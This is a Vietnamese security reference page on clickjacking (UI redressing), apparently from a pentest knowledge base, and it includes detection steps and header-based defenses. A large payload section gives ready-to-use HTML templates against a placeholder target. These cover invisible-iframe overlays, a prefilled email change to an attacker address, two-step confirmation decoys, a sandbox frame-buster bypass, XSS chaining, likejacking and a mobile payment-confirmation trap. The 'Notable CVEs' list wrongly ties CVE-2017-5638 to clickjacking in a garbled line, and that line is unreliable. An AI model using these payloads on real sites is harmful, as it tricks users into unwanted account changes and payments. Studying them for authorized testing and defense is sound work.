# Clickjacking

> Framing vô hình lừa người dùng nhấp vào các hành động trên một site mục tiêu. **Tài liệu chuyên sâu:** [`Troubleshooting_Guide/clickjacking.md`](../../../../Troubleshooting_Guide/clickjacking.md) · **Skill:** [`ai_framework/skills/`](../../../ai_framework/skills/README.md)

**Tên gọi khác / OWASP:** UI redress
**Ngôn ngữ:** [English](README.md) · Tiếng Việt
**Trạng thái:** hoàn chỉnh

## Là gì (What it is)
Clickjacking (UI redressing) tải một site mục tiêu trong một iframe trong suốt hoặc ngụy trang phía
trên một trang của kẻ tấn công, để nạn nhân tin rằng họ đang tương tác với nội dung của kẻ tấn công
trong khi các cú nhấp của họ thực ra rơi vào ứng dụng bị frame. Nạn nhân thực hiện một hành động
nhạy cảm mà không hề hay biết.

## Cơ chế hoạt động (How it works)
Kẻ tấn công xếp chồng mục tiêu bên trong một `<iframe>` được làm gần như vô hình (`opacity`, kích
thước, `z-index`) và định vị một phần tử mồi sao cho nút hấp dẫn trùng khớp với một control thật
trên trang bị frame. Khi nạn nhân nhấp vào mồi, cú nhấp được chuyển tới mục tiêu — nơi vẫn mang
cookie phiên của nạn nhân — và bất kỳ token CSRF nào trong trang bị frame cũng tự động đi kèm, nên
các biện pháp phòng chống CSRF không giúp ích. Nó hoạt động ở bất kỳ đâu mục tiêu cho phép framing:
tức là không gửi `X-Frame-Options` và không có CSP `frame-ancestors`, hoặc chúng bị cấu hình sai.

## Tác động (Impact)
Kẻ tấn công gây ra bất kỳ hành động nào mà một (hoặc vài) cú nhấp có thể kích hoạt: thay đổi cài đặt
tài khoản, xác nhận thanh toán, cấp một scope OAuth, like/follow ("likejacking"), hoặc — khi được
điền sẵn qua tham số URL — commit các giá trị do kẻ tấn công chọn. Mức độ nghiêm trọng phụ thuộc vào
hành động bị frame; thường là trung bình, cao hơn khi được nối chuỗi (ví dụ tới DOM XSS) hoặc nhắm
vào các luồng tiền/tài khoản.

## Cách phát hiện (How to detect)
- Các trang nhạy cảm phản hồi mà không có `X-Frame-Options: DENY/SAMEORIGIN` và không có CSP
  `frame-ancestors` (`curl -I … | grep -i x-frame` xác nhận nhanh).
- Trang tải thành công bên trong một iframe thử nghiệm trên một origin nước ngoài.
- Các hành động được điều khiển bởi tham số GET/URL, khiến các tấn công điền-sẵn một-cú-nhấp khả thi.
- Bất kỳ "frame buster" phía client nào hiện có đều vượt được (sandbox không có `allow-scripts`,
  hoặc double-framing chống lại `top.location`).

## Khai thác (tóm tắt) (Exploitation)
Frame mục tiêu, phủ một mồi căn chỉnh với control thật, và dụ nạn nhân nhấp; điền sẵn trạng thái qua
tham số URL để một cú nhấp commit hành động, và xếp chồng nhiều mồi cho các luồng xác nhận. Đánh bại
JS frame-buster bằng `sandbox="allow-forms"` hoặc double-framing, và nối chuỗi vào reflected/DOM XSS
khi form bị frame phản chiếu một payload. Payload đầy đủ nằm trong mục Payload phía trên.

## Payload & kỹ thuật (Payloads & techniques)
> Chắt lọc từ các tài liệu payload thực chiến — chỉ dùng cho kiểm thử được cấp phép.

### Lớp phủ cơ bản (Basic overlay)
Một iframe gần như vô hình xếp chồng trên một mồi; cú nhấp của nạn nhân rơi vào hành động bị frame,
và bất kỳ token CSRF nào cũng tự động đi kèm.
```html
<style>
  iframe { position: relative; width: 500px; height: 700px; opacity: 0.0001; z-index: 2; }
  div    { position: absolute; top: 300px; left: 60px; z-index: 1; }
</style>
<div>Click me</div>
<iframe src="https://TARGET/my-account"></iframe>
```

### Điền sẵn hành động (Prefilling the action)
Điều khiển trạng thái của mục tiêu qua tham số URL để một cú nhấp commit nó.
```html
<iframe src="https://TARGET/my-account?email=attacker@evil.com"></iframe>
<div style="position:absolute;top:330px;left:60px;">Click me</div>
```

### Luồng nhiều bước / xác nhận (Multistep / confirmation flows)
Xếp chồng nhiều mồi cho các hộp thoại xác nhận hai bước.
```html
<style>
  iframe { position: relative; width: 500px; height: 700px; opacity: 0.0001; z-index: 2; }
  .firstClick, .secondClick { position: absolute; z-index: 1; }
  .firstClick  { top: 330px; left: 50px; }
  .secondClick { top: 285px; left: 225px; }
</style>
<div class="firstClick">Click first</div>
<div class="secondClick">Click second</div>
<iframe src="https://TARGET/my-account"></iframe>
```

### Vượt frame-buster (Frame-buster bypass)
```html
<!-- sandbox without allow-scripts disables JS frame-busters but keeps form POST -->
<iframe sandbox="allow-forms" src="https://TARGET/my-account?email=attacker@evil.com"></iframe>
<div style="position:absolute;top:330px;left:60px;">Click me</div>
```
Chống lại một buster `top.location`, lồng mục tiêu bên trong một iframe thứ hai để việc chuyển hướng
chỉ di chuyển frame ở giữa, không phải cửa sổ top của kẻ tấn công (double-framing).

### Nối chuỗi với DOM XSS (Chaining with DOM XSS)
Cú nhấp kích hoạt một lần gửi form phản chiếu một payload XSS vào trang.
```html
<iframe src="https://TARGET/feedback?name=<img src=1 onerror=alert(document.domain)>&email=a@b.com&subject=x&message=x#feedbackResult"></iframe>
<div style="position:absolute;top:50px;left:50px;">Submit Feedback</div>
```

### Likejacking & biến thể di động (Likejacking & mobile variants)
```html
<!-- social like/share widget under a decoy button -->
<iframe src="https://facebook.com/plugins/like.php?href=attacker-page"
        style="opacity:0.0001;position:absolute;z-index:2;width:100px;height:50px;"></iframe>
<button style="position:absolute;z-index:1;">Win a prize!</button>
```
```html
<!-- touchscreen: shrink the frame and capture the whole viewport -->
<style>iframe { transform: scale(0.1); opacity: 0; pointer-events: all; }</style>
<iframe src="https://TARGET/payment?confirm=true"></iframe>
<button style="position:fixed;top:0;left:0;width:100%;height:100%;">Free Gift!</button>
```

### Trinh sát (Recon)
```bash
curl -I https://TARGET/sensitive-page | grep -iE "x-frame|content-security"
# No X-Frame-Options and no CSP frame-ancestors -> likely framable
```

| Thuộc tính | Hiệu ứng |
|-----------|--------|
| `opacity: 0.0001` | iframe gần như vô hình |
| `z-index: 2` | iframe nằm trên mồi |
| `sandbox="allow-forms"` | vô hiệu hóa JS buster, giữ form POST |
| `pointer-events: all` | bắt mọi cú nhấp |
| `transform: scale(0.1)` | thu nhỏ frame để nhắm chính xác |

## Phòng chống (Defenses)
1. **CSP `frame-ancestors`** — đặt `frame-ancestors 'none'` (hoặc một allowlist tường minh) trên mọi
   phản hồi; đây là biện pháp kiểm soát hiện đại, chính yếu.
2. **`X-Frame-Options: DENY`** (hoặc `SAMEORIGIN`) để bao phủ trình duyệt cũ, gửi kèm cùng CSP.
3. **Cookie `SameSite`** để request bị frame không mang theo phiên trong ngữ cảnh khác site.
4. Khi bắt buộc nhúng, thu hẹp phạm vi chặt chẽ và tránh dùng JS frame-busting phía client làm biện
   pháp phòng thủ duy nhất — nó vượt được; hãy dựa vào các header phản hồi nêu trên.

## Tìm CVE từ đầu (Finding CVEs from scratch)
- **NVD** — https://nvd.nist.gov/vuln/search?query=Clickjacking
- **CVE.org** — https://www.cve.org/CVERecord/SearchResults?query=Clickjacking
- **Exploit-DB** — https://www.exploit-db.com/search?q=Clickjacking
- **GitHub Advisories** — https://github.com/advisories?query=Clickjacking
- **OSV** — https://osv.dev/list?q=Clickjacking
- **Cộng đồng** — r/netsec, blog bảo mật của nhà cung cấp, HackerOne Hacktivity, infosec trên X/Twitter.
- _Mẹo tìm kiếm: thêm sản phẩm + phiên bản mục tiêu, ví dụ `Clickjacking <product> <version>`._

## Các CVE tiêu biểu (Notable CVEs)
_Mang tính minh họa — hãy kiểm chứng lại trên NVD trước khi trích dẫn._
- ngoài thời kỳ `CVE-2017-5638`, clickjacking thường được báo cáo dưới dạng một điểm yếu thiếu-header
  (CWE-1021) thay vì một CVE của sản phẩm; nhiều báo cáo bug-bounty trích dẫn việc thiếu
  `X-Frame-Options`.
- `CVE-2015-1241` — vấn đề UI-redress / liên quan clickjacking của Chrome cho phép chiếm quyền chạm
  khác origin trên thiết bị cảm ứng.
- _Ví dụ kinh điển: các sâu "likejacking" trên Facebook năm 2011 đã frame nút Like dưới nội dung mồi
  để phát tán spam._

## Tham khảo (References)
- PortSwigger Web Security Academy — Clickjacking (UI redressing).
- OWASP — Clickjacking Defense Cheat Sheet.
- W3C CSP — `frame-ancestors` directive (CSP Level 2/3).
